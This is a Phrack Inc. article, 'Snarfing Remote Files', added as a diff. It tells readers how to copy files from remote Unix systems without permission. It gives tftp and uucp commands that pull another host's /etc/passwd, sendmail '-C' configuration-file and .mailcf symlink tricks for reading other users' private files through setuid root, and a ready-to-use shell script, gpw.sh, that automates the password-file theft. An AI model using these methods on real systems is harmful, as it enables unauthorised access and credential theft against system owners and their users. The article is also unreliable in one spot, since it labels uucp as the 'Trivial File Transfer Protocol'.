@@ -1,0 +1,153 @@
+
+                               ==Phrack Inc.==
+ 
+                     Volume Three, Issue 28, File #6 of 12
+                     +++++++++++++++++++++++++++++++++++++
+                     +                                   +
+                     +       Snarfing Remote Files       +
+                     +                                   +
+                     +                by                 +
+                     +                                   +
+                     +           Dark OverLord           +
+                     +                                   +
+                     +++++++++++++++++++++++++++++++++++++
+ 
+There are many ways of getting copies of files from a remote system that you
+do not have permission to read or an account on login on to and access them
+through.  Many administrators do not even bother to restrict many access
+points that you can use.
+ 
+Here are the simplest ways:
+ 
+ 
+A)  Use uucp(1) [Trivial File Transfer Protocol] to retrieve a copy
+    of a file if you are running on an Internet based network.
+ 
+B) Abuse uucp(1) [Unix to Unix Copy Program] to retrieve a copy of a file
+   if uucp connections are running on that system.
+ 
+C) Access one of many known security loopholes.
+ 
+ 
+In the following examples, we will use the passwd file as the file to acquire
+since it is a readable file that can be found on most systems that these
+attacks are valid on.
+ 
+Method A :
+ 
+1) First start the tftp program:
+    Enter the command:
+ 
+ tftp
+ 
+    [You have the following prompt:]
+ 
+ tftp>
+ 
+ 
+2) The next step is to connect to the system that you wish to retrieve files
+    from.  At the tftp, type:
+ 
+ tftp> connect other.system.com
+ 
+ 
+3) Now request the file you wish to get a copy of (in our case, the
+    passwd file /etc/passwd ):
+ 
+ tftp> get /etc/passwd /tmp/passwd
+ 
+    [You should see something that looks like the following:]
+ 
+ Received 185659 bytes in 22 seconds.
+ 
+4) Now exit the tftp program with the "quit" command:
+ 
+ tftp> quit
+ 
+You should now have a copy of other.system.com's passwd file in your directory.
+ 
+NOTE:  Some Unix systems' tftp programs have a different syntax.  The above was
+       tested under SunOS 4.0
+ 
+For example, on Apollos, the syntax is:
+ 
+    tftp -{g|g!|p|r|w} <local file> <host> <foreign file> [netascii|image]
+ 
+Thus you must use the command:
+ 
+ tftp -g password_file networked-host /etc/passwd
+ 
+Consult your local "man" pages for more info (or in other words RTFM).
+ 
+At the end of this article, I will include a shell script that will snarf a
+password file from a remote host.  To use it type:
+ 
+ gpw system_name
+ 
+Method B :
+ 
+Assuming we are getting the file  /etc/passwd  from the system uusucker, and
+our system has a direct uucp connection to that system, it is possible to
+request a copy of the file through the uucp links.  The following command will
+request that a copy of the passwd file be copied into uucp's home directory
+/usr/spool/uucppublic :
+ 
+ uucp -m uusucker!/etc/passwd '>uucp/uusucker_passwd'
+ 
+The flag "-m" means you will be notified by mail when the transfer is
+completed.
+ 
+Method C:
+ 
+    The third possible way to access the desired file requires that you have
+the login permission to the system.
+ 
+In this case we will utilize a well-known bug in Unix's sendmail daemon.
+ 
+The sendmail program has and option "-C" in which you can specify the
+configuration file to use (by default this file is /usr/lib/sendmail.cf or
+/etc/sendmail.cf).  It should also be noted that the diagnostics outputted by
+sendmail contain the offending lines of text.  Also note that the sendmail
+program runs setuid root.
+ 
+The way you can abuse this set of facts (if you have not yet guessed) is by
+specifying the file you wish read as the configuration file.  Thus the command:
+ 
+ sendmail -C/usr/accounts/random_joe/private/file
+ 
+Will give you a copy of random joe's private file.
+ 
+Another similar trick is to symlink your .mailcf file to joe's file and mail
+someone.  When mail executes sendmail (to send the mail), it will load in your
+mailcf and barf out joe's stuff.
+ 
+First, link joe's file to your .mailcf .
+ 
+ ln -s /usr/accounts/random_joe/private/file $HOME/.mailcf
+ 
+Next, send mail to someone.
+ 
+ mail C488869@umcvmb.missouri.edu
+ 
+And have fun.
+ 
+-=-Cut Here=-=-=-Cut Here=-=-=- gpw.sh =-=-=-Cut Here=-=-=-=-Cut Here=-=-=-=-=
+:
+: gpw copyright(c) Dark Overlord
+:
+/usr/ucb/tftp $1 << EOF
+mode ascii
+verbose
+trace
+get /etc/passwd /tmp/pw.$1
+quit
+EOF
+-=-Cut Here=-=-=-Cut Here=-=-=-Cut Here=-=-=-Cut Here=-=-=-=-Cut Here=-=-=-=-=
+_______________________________________________________________________________
+
+** END OF MESSAGE **
+#EOI
+
+<EOF>   Exodus
+
+
